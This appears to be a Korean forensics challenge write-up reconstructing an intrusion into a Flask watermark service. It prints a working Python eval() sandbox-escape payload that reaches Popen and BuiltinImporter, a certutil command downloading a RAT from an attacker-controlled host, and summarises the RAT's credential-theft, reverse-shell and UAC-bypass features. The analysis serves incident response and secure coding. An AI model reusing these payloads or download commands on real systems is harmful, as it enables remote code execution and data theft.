> **한 줄 결론**: `eval(expr, {'__builtins__': {}}, {})` 는 샌드박스가 아니다. 객체 그래프를 타고 `subprocess.Popen` 과 `BuiltinImporter` 에 도달할 수 있고, 이 사건에서 실제로 그렇게 뚫렸다. 그리고 **'최초 접근'과 '최초 침해'는 38분 차이의 다른 사건**이다.

## 무엇이 주어졌나

`Desktop.7z` 하나 (MD5 `d9d56773190f37400d3c7e04554798f4`). 안에는 워터마크 서비스의 소스와 SQLite DB, 그리고 침해된 PC 의 아티팩트 묶음이 들어 있다.

도구는 `python-evtx`, `python-registry`, `py7zr`, `ripgrep`, GNU `strings`.

## 1. 최초 접근 vs 최초 침해

문제가 "최초 접근 시점" 을 묻는데, 답이 두 개 나온다.

| 시각 (UTC) | 시각 (KST) | 사건 | 근거 |
|---|---|---|---|
| 2026-06-29 01:16:05 | 10:16:05 | 계정 `test2` 가 워터마크 서비스에 **회원가입** (IP `192.168.213.1`) | `watermark.db` `access_log` id=50 |
| 2026-06-29 01:54:34 | 10:54:34 | `eval()` 인젝션 페이로드 실행 → **RCE 성공** | `watermark_job` id=34, `custom_x` |

첫 번째는 아직 정상적인 서비스 이용 범위다. 회원가입은 누구나 한다. 두 번째가 실질적인 시스템 침해다.

판단 근거는 두 테이블을 겹쳐 보는 것이었다. `access_log`(회원가입/로그인)에서 **정상적으로는 로컬(`127.0.0.1`)에서만 쓰이던 서비스에 외부 IP(`.1`)가 붙은 시점**, 그리고 `watermark_job`(워터마크 작업 요청)에서 그 계정이 처음으로 비정상 좌표식을 제출한 시점.

**"발판 확보" 와 "침해 성공" 을 한 시점으로 뭉개면 38분이 사라진다.** 사고 대응에서는 이 구간이 곧 "공격자가 정찰한 시간" 이다.

## 2. 근본 원인 — 빈 __builtins__ 라는 착각

Flask 기반 `watermark_service` 의 `utils.py`:

```python
result = eval(prepared, {'__builtins__': {}}, {})
```

사용자가 넣은 커스텀 워터마크 좌표(`custom_x` / `custom_y`)를 그대로 Python `eval()` 에 넘긴다. `__builtins__` 를 빈 딕셔너리로 줘서 내장 함수 접근을 막으려 했지만, 이건 파이썬 eval 샌드박싱에서 **가장 잘 알려진 우회 대상**이다.

거기에 `forms.py` 에서 `custom_x`/`custom_y` 가 자유 문자열 필드로 정의돼 있어 서버 측 형식 검증도 없었다. 좌표를 받는 필드면 숫자만 받으면 됐다.

### 우회 ① — 클래스 계층 탐색

```python
[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__=='Popen'][0](
    ['cmd','/c','start /B pythonw C:/Users/User/s.pyw']
)
```

빈 튜플 `()` 에서 시작해 `__class__` → `__bases__[0]`(즉 `object`) → `__subclasses__()` 로 **인터프리터에 로드된 모든 서브클래스**를 열거한다. 그중 `Popen` 을 찾아 직접 인스턴스화하면 끝이다. 내장 함수를 하나도 안 쓰고 프로세스를 띄운다.

2026-06-29 01:54:34 UTC 실행. `cmd.exe` 를 경유해 `pythonw` 로 `s.pyw` 를 기동했다.

### 우회 ② — 임포터 경유

```python
# 같은 서브클래스 목록에서 BuiltinImporter 를 찾아
BuiltinImporter.load_module('nt').system(...)
```

`BuiltinImporter` 를 찾아 `load_module('nt')` 로 Windows 의 저수준 os 모듈을 임포트하고 `nt.system()` 을 손에 넣는다. 01:55:36 UTC 에 실행된 명령:

```
certutil -urlcache -split -f http://192.168.213.130:8080/api/v2/assets/update C:/Users/User/s.pyw
```

`/api/v2/assets/update` — **정상 API 엔드포인트처럼 생긴 URL** 에서 RAT 페이로드를 받는다. 프록시 로그를 눈으로 훑으면 그냥 API 호출로 보인다.

`certutil -urlcache -split -f` 는 전형적인 LOLBin 다운로더다. 서명된 Microsoft 바이너리라 애플리케이션 화이트리스팅을 통과한다.

**정리하면**: 정상 계정으로 로그인 → 애플리케이션이 신뢰하는 입력 채널(워터마크 좌표)에 파이썬 표현식 주입 → 제한된 eval 샌드박스 탈출 → 임의 OS 명령 실행. builtins 화이트리스트/블랙리스트 방식의 eval 샌드박싱이 **구조적으로** 우회 가능하다는 전형적 사례다.

## 3. 후속 행위 — 다섯 단계

**① 백도어 반입.** `certutil` 로 위장 URL 에서 `s.pyw`(3중 난독화 파이썬 RAT, 자체 명칭 `dfc_rat2`)를 받아 `pythonw` 로 무창 실행.

**② 흔적 은폐 시도.** 같은 시간대에 **다른 계정 `seol` 명의로 동일 페이로드를 내려받는 삭제된 `watermark_job` 레코드**가 있었다. SQLite 미할당 영역에서 문자열로 복구했다. 로그 조작으로 책임을 넘기려 했거나 병행 테스트였을 것이다.

SQLite 는 `DELETE` 해도 페이지가 바로 회수되지 않는다. **미할당 영역(freelist/unused space)에 원문이 남는다.** 이 문제에서는 그 덕분에 지워진 3건이 복구됐다.

**③ 권한 상승 시도.** Prefetch 에 `CMSTP.EXE`, `DLLHOST.EXE` 실행 흔적. 둘 다 알려진 UAC 우회 LOLBin 이다. 복호화한 RAT 코드 안에도 CMSTP 기반 UAC 우회 모듈이 들어 있어 정황이 맞물린다.

**④ 지속성.** 예약 작업 `WindowsSystemHealthCheck` 를 등록해 로그온 시 `pythonw` 로 `SecurityHealthHost.dat` 를 자동 실행하도록 구성.

`SecurityHealthHost.dat` 의 SHA-256 이 `s.pyw` 와 **동일**하다. 확장자만 `.dat` 로 바꾼 같은 파일이다. 레지스트리 Run/Winlogon 키에는 악성 등록이 없었고, **확인된 유일한 지속성은 이 예약 작업**이다.

**⑤ 정찰.** Prefetch 타임스탬프 순서가 그대로 discovery 단계를 보여 준다.

```
02:05:05  TASKLIST.EXE                        프로세스 목록
02:09:42  SYSTEMINFO.EXE / FINDSTR.EXE / WMIC.EXE   시스템·도메인·백신 정보
04:00:36  IPCONFIG.EXE                        네트워크 구성
```

## 4. RAT 기능 — 정적 분석 기준

마샬링된 코드 객체에서 확인된 모듈들이다. **실행 여부는 확인되지 않았다.**

- C2 비콘 — `http://192.168.213.130:8080`, 하드코딩 키 `dfc_rat2_default_key_change_me!!`
- 리버스 TCP 셸 / 히든 명령 실행
- `ShellExecuteW` 기반 자동 권한상승 시도
- Chrome 쿠키·저장 비밀번호 복호화 탈취
- Discord 토큰 탈취 (`discord.com/api/v9/users/@me` 호출)
- 안티분석 — 디버거 프로세스 `httpdebuggerui.exe` 탐지

하드코딩 키가 `…change_me!!` 다. 공개 RAT 템플릿을 그대로 쓰고 키도 안 바꿨다는 뜻이다.

"코드에 있다" 와 "실행됐다" 는 다르다. 각 기능의 실행 흔적(브라우저 DB 접근, 아웃바운드 연결)까지 확인되지 않았으므로 **정적 코드 분석 기준**임을 명시했다.

## 5. 시간대 보정 — 세 개의 시계

이 문제에서 가장 성가셨던 부분이다.

SYSTEM 레지스트리 하이브의 `TimeZoneInformation` 키에 `ActiveTimeBias = 420분`(7시간)이 기록돼 있다. 사건 당시 시스템은 **PDT(UTC-7)** 를 쓰고 있었다.

그런데 애플리케이션 계층은 다르다.

| 시간 소스 | 기준 | 확인 방법 |
|---|---|---|
| 업로드 파일명 타임스탬프 | `datetime.now()` → **PDT** | 시스템 타임존과 정합 |
| `watermark.db` 레코드 | `datetime.utcnow()` → **UTC** | 파일명과 7시간 차 |
| Prefetch / Task XML | 시스템 로컬 (**PDT**) | — |

같은 사건이 아티팩트에 따라 7시간 다른 시각으로 기록된다. 보정 없이 타임라인을 만들면 **RCE 가 백도어 다운로드보다 나중에 일어난 것처럼** 보인다.

보고서에서는 분석 편의를 위해 UTC 와 KST(UTC+9) 를 병기했다.

## 7. 최종 목적 — 격리를 우회한 데이터 유출

워터마크 서비스는 사용자별 업로드 폴더(`uploads/1`, `/2`, `/3` …)로 파일을 격리하도록 설계돼 있었다. 애플리케이션 레벨에서는 남의 파일을 못 본다.

그런데 공격자는 이미 **OS 권한**을 갖고 있었다. 애플리케이션의 접근 통제는 애플리케이션 안에서만 유효하다. 관리자 계정 `test` 소유의 비워터마크 원본 기밀 이미지 `confidential_test.png` 가 공격자 제어하의 `C:\Users\User\Desktop\` 및 `Downloads\` 로 옮겨진 흔적이 확인됐다.

## 정리 — 이 문제에서 남는 것

**`eval()` 은 격리할 수 없다.** `__builtins__` 를 비우는 것은 방어가 아니라 지연이다. 객체 그래프가 살아 있는 한 `__subclasses__()` 로 `Popen` 이든 `BuiltinImporter` 든 도달한다. 표현식 평가가 필요하면 `ast.literal_eval` 이나 전용 파서를 쓰고, 좌표 같은 값은 애초에 숫자로 검증하면 된다.

**접근과 침해를 나눠 적는다.** 회원가입 시점과 RCE 시점 사이의 38분이 공격자가 서비스를 파악한 시간이다. 한 시점으로 합치면 그 구간이 분석에서 사라진다.

**삭제된 SQLite 레코드는 자주 살아 있다.** 미할당 영역 문자열 검색만으로 은폐 시도 3건이 복구됐다.

**시간대는 계층마다 다르다.** 시스템 타임존(PDT), `datetime.now()`(PDT), `datetime.utcnow()`(UTC) 가 한 사건 안에 섞여 있었다. `ActiveTimeBias` 를 먼저 확인하고 아티팩트별 기준을 못 박은 다음에야 타임라인이 맞았다.

**애플리케이션 격리는 OS 권한 아래에서 무의미하다.** 사용자별 폴더 분리는 앱을 통해 들어올 때만 유효하다.
